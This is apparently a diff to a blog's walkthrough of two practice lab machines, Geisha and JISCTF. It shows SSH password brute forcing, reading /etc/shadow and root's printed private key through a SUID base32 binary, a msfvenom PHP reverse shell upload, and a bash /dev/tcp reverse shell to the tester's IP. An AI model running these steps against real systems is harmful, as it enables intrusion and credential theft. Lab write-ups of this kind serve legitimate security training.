@@ -644,9 +644,175 @@ uid=0(root) gid=0(root) groups=0(root),100(users),1001(baksteen)
 
 <h3 id="geisha">Geisha</h3>
 
+<ol>
+  <li>
+    <p>Enumeration: run port scan against the target found several port open: 21,22,80,7125,7080,8088,9198, then run <code class="highlighter-rouge">nmap</code> and find, since we have 3 ports that used for web service this will be the first step to enumerate further.</p>
+  </li>
+  <li>Web Fuzzing: running webenum against port 7125 which is run as nginx found <code class="highlighter-rouge">passwd</code> and <code class="highlighter-rouge">shadow</code>:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>200      GET       27l       39w     1432c http://192.168.218.82:7125/passwd
+403      GET        7l        9w      154c http://192.168.218.82:7125/shadow
+</code></pre></div>    </div>
+    <p>Download that <code class="highlighter-rouge">passwd</code> file found that this is contains users, which mean that the web root directory on port 7125, most likely point out to the <code class="highlighter-rouge">/etc/</code> directory that contain <code class="highlighter-rouge">passwd</code> and <code class="highlighter-rouge">shadow</code> files, the user that look interesting is on the following line:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
+</code></pre></div>    </div>
+  </li>
+  <li>Brute Forcing: run tools like hydra or ssb (most faster):
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ ssb -w /usr/share/wordlists/rockyou.txt -t 30s geisha@192.168.218.82
+...
+[VLD] Connected with 'letmein'.
+</code></pre></div>    </div>
+    <p>This is mean we found the password: <code class="highlighter-rouge">geisha:letmein</code>.</p>
+  </li>
+  <li>Initiation: run ssh with that password, we can successfully connected.
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ ssh geisha@192.168.218.82 -p 22         
+...
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+geisha@geisha:~$
+</code></pre></div>    </div>
+  </li>
+  <li>System Enumeration: since this is linux machine run several command to get know that place, found the following binary file with SUID:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>geisha@geisha:~$ ls -la $(echo $PATH|tr ":" " ") | grep rws
+-rwsr-sr-x  1 root root       43712 Feb 28  2019 base32
+</code></pre></div>    </div>
+    <p>Check <code class="highlighter-rouge">gtfobins</code> found that with that base32 file we can read files, since that is SUID of root, it’s mean we can read shadow file.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>base32 /etc/shadow | base32 -d
+...
+root:$6$3haFwrdHJRZKWD./$LYiTApGClgwmFE3TXMRtekWpGOY6fSpnTorsQL/FBr9YdOW4NHMzYFkOLu8qJQVa1wqfEC3a.SZeTHIyEhlPF0:18446:0:99999:7:::
+geisha:$6$YtDFbbhHHf5Ag5ej$3EjLFKW1aSNBlfAhcyjmY97eLrNtbzDWQ9z5YvSvuA65kH7ZgHR1f9VGFhAEGGqiKAtF8//U45M8QOHouQrWb.:18494:0:99999:7:::
+</code></pre></div>    </div>
+    <p>Then run <code class="highlighter-rouge">unshadow</code> and <code class="highlighter-rouge">john</code> for trying to crack that shadow file:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ unshadow passwd shadow &gt; unshadowed.txt
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+...
+</code></pre></div>    </div>
+    <p>found nothing but geisha password which is <code class="highlighter-rouge">letmein</code>, so trying to grab keys from root directory:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>geisha@geisha:/$ base32 /root/.ssh/id_rsa.pub | base32 -d
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjd5XD/yhKyc5I8JLKFUSe3TV8jDLVhlSkQw9Dyk+TBfm4+Hg5leshNjcmphIIVyAlLfj9NCQounuIbZYaaeej86ngZyFcR1KSXCgY4o0DbaXulfnz0UAvVdIQEK3OWsKuSy99fTz7Lu1L8jyzjXDhoLVMN3mjxzUrHmV/CXurDRkyVt3nJ4BSG7G6/Gj8oWqJRR+lymgF/ehPYr3v9tmvTn1VTxPjB3kuQLMoQqYrl5tYgHp+Ah/HKESb+jd2XWWF6BO3MLo+2WG5Pu3L/+aoR4y6KnAfeWfrV8dezvYsj+9PHbpNJKbMejzNm37+XCuCuiHQHJdsK0NpmOjgcAV9
+geisha@geisha:/$ base32 /root/.ssh/id_rsa | base32 -d
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4
+OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5
+89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd
+5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6
+fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26
+TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww
+WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U
+1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR
+Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb
+8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+
+10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO
+jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o
+2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/
+cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl
+THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub
+RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH
+xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE
+1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr
+edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ
+65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/
+XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh
+zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf
+v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M
+OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv
+bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=
+-----END RSA PRIVATE KEY-----
+</code></pre></div>    </div>
+  </li>
+  <li>Privilege Escalation: since we have that id_rsa, we can use it to connect that target with ssh, just need to creat that file and change the mode for permissions:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ vim id_rsa
+└─$ chmod 600 ./id_rsa
+└─$ ssh -i id_rsa root@192.168.218.82
+...
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@geisha:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@geisha:~#
+</code></pre></div>    </div>
+  </li>
+</ol>
+
 <h3 id="jisctf">JISCTF</h3>
 
-<h3 id="final-table-methodology">Final table methodology</h3>
+<ol>
+  <li>Enumeration: run port scan found that only ssh and web on port 80 are open, scan them both found that ssh is on version 7.2p2, but since port 80 is open trying to take that fiest, on nmap it found the following directories from http-robots.txt file:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| / /backup /admin /admin_area /r00t /uploads
+</code></pre></div>    </div>
+    <p>Checking on each found that curl admin_area give some page that contain comment about user and password:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ curl http://192.168.218.25/admin_area/
+&lt;!--	username : admin
+ password : 3v1l_H@ck3r
+ Your flag is in another file...
+--&gt;
+</code></pre></div>    </div>
+    <p>Going to the web root directory, authenticate and found index.php, then we can upload files, so since this is php page based we can upload reverse shell based php, first create that file with <code class="highlighter-rouge">msfvenom</code>:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ msfvenom -p php/reverse_php lhost=192.168.45.203 lport=80 -f raw -o rs_x86_80.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 3002 bytes
+Saved as: rs_x86_80.php
+</code></pre></div>    </div>
+  </li>
+  <li>Initiation: then upload the file, on other terminal open nc for listen on port 80 and curl that file, after that we should have reverse shell that no so interactive:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ curl http://192.168.218.25/uploaded_files/rs_x86_80.php
+</code></pre></div>    </div>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ nc -nvlp 80
+listening on [any] 80 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.218.25] 39942
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></div>    </div>
+  </li>
+  <li>Interactive Shell: for make the shell more interactive run the following and open new terminal to get another shell sesion:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.45.203/80 0&gt;&amp;1'
+</code></pre></div>    </div>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ nc -nvlp 80
+listening on [any] 80 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.218.25] 39954
+bash: cannot set terminal process group (1241): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Jordaninfosec-CTF01:/var/www/html/uploaded_files$
+</code></pre></div>    </div>
+    <p>Then running the following steps:</p>
+    <ul>
+      <li><code class="highlighter-rouge">Ctrl-Z</code></li>
+      <li><code class="highlighter-rouge">stty -a | cut -d';' -f2-3 | head -n1</code> should show the values of rows and columns.</li>
+      <li><code class="highlighter-rouge">stty raw -echo;fg</code> should bring the shell to front ground.</li>
+      <li><code class="highlighter-rouge">stty rows 27 columns 120</code> the values here are from the first stty command output.</li>
+      <li><code class="highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")</code> spawn the shell in bash.</li>
+    </ul>
+  </li>
+  <li>System Enumeration: enumerate the target with <code class="highlighter-rouge">linpeas</code> and also found under <code class="highlighter-rouge">/home/</code> directory that there is user named technawi, so run the following command:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -type f -user technawi -readable 2&gt;/dev/null
+</code></pre></div>    </div>
+    <p>found the following file which look interesting:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/mysql/conf.d/credentials.txt
+</code></pre></div>    </div>
+    <p>that file contain the user and password for that technawi user:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username : technawi
+password : 3vilH@ksor
+</code></pre></div>    </div>
+  </li>
+  <li>Privilege Escalation: run <code class="highlighter-rouge">su</code> with technawi work with that password, check what command that user can run with <code class="highlighter-rouge">sudo -l</code> showed us that he can run all so run <code class="highlighter-rouge">sudo su</code> and we have root.
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Jordaninfosec-CTF01:/home/technawi$ su technawi
+Password:
+technawi@Jordaninfosec-CTF01:~$ sudo -l
+Matching Defaults entries for technawi on Jordaninfosec-CTF01:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User technawi may run the following commands on Jordaninfosec-CTF01:
+(ALL : ALL) ALL
+technawi@Jordaninfosec-CTF01:~$ sudo su
+root@Jordaninfosec-CTF01:/home/technawi# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Jordaninfosec-CTF01:/home/technawi#
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h4 id="final-table-methodology">Final table methodology</h4>
 
 <p>After finish them all, I came up with the following table.</p>
 
